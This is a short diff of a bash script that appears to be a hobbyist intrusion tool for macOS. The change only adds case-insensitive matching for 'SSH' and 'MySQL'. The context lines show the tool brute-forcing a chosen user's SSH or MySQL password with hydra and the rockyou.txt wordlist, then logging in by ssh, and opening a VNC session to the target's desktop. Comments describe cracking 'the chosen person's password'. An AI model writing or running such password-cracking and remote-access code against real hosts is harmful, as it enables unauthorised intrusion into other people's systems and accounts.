@@ -49,7 +49,7 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                 exit; # stops the porgram
 
-            elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
+            elif [[ $service == 22 ]] || [[ $service == "ssh" ]] || [[ $service == "SSH" ]]; then
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host #Cracks the chocien persons password for 22(SSH)
                 echo #this is a space in the program
                 echo "Connecting to $user@$host" #tell's the user that the software is trying to connecto to the-
@@ -57,7 +57,7 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
                 sleep 3
                 ssh $user@$host #this connects to the users computer by 22 (SSH[Secure Shell])
             
-            elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
+            elif [[ $service == 3306 ]] || [[ $service == "mysql" ]] || [[ $service == "MySQL" ]]; then 
                 hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
                 echo "Loading to MySQL server..." # tells the user that MySQL is Loading 
                 sleep 3; #makes the program wait for 3 seconds
